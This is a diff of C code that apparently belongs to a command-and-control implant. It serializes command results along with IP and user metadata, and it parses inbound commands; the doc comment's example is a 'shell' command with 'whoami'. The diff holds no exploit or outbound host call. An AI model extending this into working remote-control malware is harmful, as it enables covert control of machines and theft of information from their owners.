@@ -8,113 +8,150 @@
 #include <stdlib.h>
 #include <string.h>
 
-//typedef struct
+// typedef struct
 //{
-//    char agent_id[37]; // UUID as a string (max 36 chars + null terminator)
-//    char* command_result_data; // Variable-length string
-//    char* command_id; // Variable-length string
-//} OutboundJsonDataStruct;
+//     char agent_id[37]; // UUID as a string (max 36 chars + null terminator)
+//     char* command_result_data; // Variable-length string
+//     char* command_id; // Variable-length string
+// } OutboundJsonDataStruct;
 //
-//typedef struct
+// typedef struct
 //{
-//    char* command_id;
-//    char* command; // Variable-length string
-//    char* args; // Variable-length string
+//     char* command_id;
+//     char* command; // Variable-length string
+//     char* args; // Variable-length string
 //
-//} InboundJsonDataStruct;
+// } InboundJsonDataStruct;
 
 typedef struct
 {
-    char* command_result_data; // Variable-length string
-    char* command_id; // Variable-length string
-    char* agent_id;
+    char *command_result_data; // Variable-length string
+    char *command_id;          // Variable-length string
+    char *agent_id;
+    // metadata fields
+    char *int_ip;
+    char *ext_ip;
+    char *user;
 } OutboundJsonDataStruct;
 
 typedef struct
 {
-    char* command_id;
-    char* command; // Variable-length string
-    char* args; // Variable-length string
-    char* agent_id;
+    char *command_id;
+    char *command; // Variable-length string
+    char *args;    // Variable-length string
+    char *agent_id;
 } InboundJsonDataStruct;
 
 // Function declarations (fixes conflicting types issue)
-char* encode_json(const char* uuid, const char* command_result_data, const char* command_id);
-InboundJsonDataStruct decode_command_json(const char* json_str);
+char *encode_json(const char *uuid, const char *command_result_data, const char *command_id);
+InboundJsonDataStruct decode_command_json(const char *json_str);
 // void free_json_data(OutboundJsonDataStruct *OutboundJsonDataStruct);
 
-// how to use
-// int main() {
-//     // Example UUID as a string
-//     const char *uuid = "550e8400-e29b-41d4-a716-446655440000";
-//
-//     // Example command_result_data string
-//     const char *command_result_data = "Example variable-length string command_result_data.";
-//
-//     // Encode JSON
-//     char *json_str = encode_json(uuid, command_result_data);
-//     if (!json_str) {
-//         fprintf(stderr, "Failed to encode JSON\n");
-//         return 1;
-//     }
-//
-//     printf("Encoded JSON: %s\n", json_str);
-//
-//     // Decode JSON
-//     OutboundJsonDataStruct decoded = decode_json(json_str);
-//     printf("Decoded UUID: %s\n", decoded.agent_id);
-//     printf("Decoded command_result_data: %s\n", decoded.command_result_data);
-//
-//     // Cleanup
-//     SecureFree(json_str);
-//     SecureFree(decoded.command_result_data);
-//
-//     return 0;
-// }
-
+char *encode_json(const char *agent_id, const char *command_result_data, const char *command_id)
 /**
- * Encodes a OutboundJsonDataStruct structure into a JSON string.
+ * encode_json - Creates a JSON-encoded string representing the result of a command execution.
+ *
+ * This function constructs a JSON object with the given agent ID, command result data, and
+ * command ID. It also includes a "metadata" sub-object containing additional static fields:
+ * "ext_ip", "int_ip", and "context".
+ *
+ * Example output:
+ * {
+ *   "agent_id": "abc123",
+ *   "command_result_data": "some data",
+ *   "command_id": "cmd456",
+ *   "metadata": {
+ *     "ext_ip": "ext_ip",
+ *     "int_ip": "int_ip",
+ *     "context": "context"
+ *   }
+ * }
+ *
+ * @param agent_id             A string representing the unique ID of the agent.
+ * @param command_result_data  A string containing the result of a command execution.
+ * @param command_id           A string identifier for the command.
+ *
+ * @return A heap-allocated JSON string representation of the data.
+ *         The caller is responsible for freeing the returned string.
+ *         Returns NULL if memory allocation fails.
  */
-char* encode_json(const char* agent_id, const char* command_result_data, const char* command_id)
 {
-    cJSON* root = cJSON_CreateObject();
+    cJSON *root = cJSON_CreateObject();
     if (!root)
         return NULL;
 
+    // Add top-level fields
     cJSON_AddStringToObject(root, "agent_id", agent_id);
     cJSON_AddStringToObject(root, "command_result_data", command_result_data);
     cJSON_AddStringToObject(root, "command_id", command_id);
 
-    char* json_str = cJSON_PrintUnformatted(root);
+    // Create metadata object
+    cJSON *metadata = cJSON_CreateObject();
+    if (!metadata)
+    {
+        cJSON_Delete(root);
+        return NULL;
+    }
+
+    // Add metadata fields
+    cJSON_AddStringToObject(metadata, "ext_ip", "ext_ip");
+    cJSON_AddStringToObject(metadata, "int_ip", "int_ip");
+    cJSON_AddStringToObject(metadata, "context", "context");
+
+    // Add metadata to root
+    cJSON_AddItemToObject(root, "metadata", metadata);
+
+    // Convert to string
+    char *json_str = cJSON_PrintUnformatted(root);
     cJSON_Delete(root);
 
     return json_str; // Caller must free this
 }
 
+InboundJsonDataStruct decode_command_json(const char *json_str)
 /**
- * Decodes a JSON string into a OutboundJsonDataStruct structure.
+ * decode_command_json - Parses a JSON string containing command information into a structured format.
+ *
+ * This function takes a JSON string representing an inbound command and extracts the fields:
+ * "command_id", "command", and "args". These are stored in an InboundJsonDataStruct for further use.
+ *
+ * Expected input format:
+ * {
+ *   "command_id": "111-111-111-111",
+ *   "command": "shell",
+ *   "args": "whoami"
+ * }
+ *
+ * The returned struct contains dynamically allocated strings for each field if present and valid.
+ *
+ * @param json_str  A null-terminated JSON string to parse.
+ *
+ * @return An InboundJsonDataStruct containing the parsed data. If parsing fails, all fields are NULL.
+ *         The caller is responsible for freeing the returned strings in the struct (via `free()`).
  */
-InboundJsonDataStruct decode_command_json(const char* json_str)
 {
-    InboundJsonDataStruct result = { NULL };
+    InboundJsonDataStruct result = {NULL};
 
-    cJSON* root = cJSON_Parse(json_str);
+    cJSON *root = cJSON_Parse(json_str);
     if (!root)
         return result;
 
     // cJSON *agent_id = cJSON_GetObjectItemCaseSensitive(root, "agent_id");
-    cJSON* command_id = cJSON_GetObjectItemCaseSensitive(root, "command_id");
-    cJSON* command = cJSON_GetObjectItemCaseSensitive(root, "command");
-    cJSON* args = cJSON_GetObjectItemCaseSensitive(root, "args");
+    cJSON *command_id = cJSON_GetObjectItemCaseSensitive(root, "command_id");
+    cJSON *command = cJSON_GetObjectItemCaseSensitive(root, "command");
+    cJSON *args = cJSON_GetObjectItemCaseSensitive(root, "args");
 
-    if (cJSON_IsString(command_id) && command_id->valuestring) {
+    if (cJSON_IsString(command_id) && command_id->valuestring)
+    {
         result.command_id = _strdup(command_id->valuestring); // Caller must free
     }
 
-    if (cJSON_IsString(command) && command->valuestring) {
+    if (cJSON_IsString(command) && command->valuestring)
+    {
         result.command = _strdup(command->valuestring); // Caller must free
     }
-    if (cJSON_IsString(args) && args->valuestring) {
+    if (cJSON_IsString(args) && args->valuestring)
+    {
         result.args = _strdup(args->valuestring); // Caller must free
     }
 
